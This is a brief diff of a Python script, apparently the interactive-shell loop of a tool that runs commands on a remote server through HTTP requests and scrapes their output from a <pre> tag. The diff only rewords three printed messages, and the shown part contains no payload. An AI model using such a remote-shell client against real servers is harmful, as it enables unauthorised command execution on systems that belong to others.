@@ -29,15 +29,15 @@ def interactiveShell(server_ip):
                         output_text = pre_text[ms_index + 2:]
                         print(output_text)
                     else:
-                        print("Text 'ms' not found in the <pre> tag content.")
+                        print("'ms' not found.")
                 else:
-                    print("No <pre> tag found in the response.")
+                    print("No <pre> tag found html.")
             except requests.RequestException as e:
                 print(f"Error making request to {full_url}: {e}")
 
 if __name__ == "__main__":
     if len(sys.argv) != 2:
-        print('Usage: python script.py <Server IP address>')
+        print('Usage: python script.py <IP address>')
     else:
         server_ip = sys.argv[1]
         interactiveShell(server_ip)
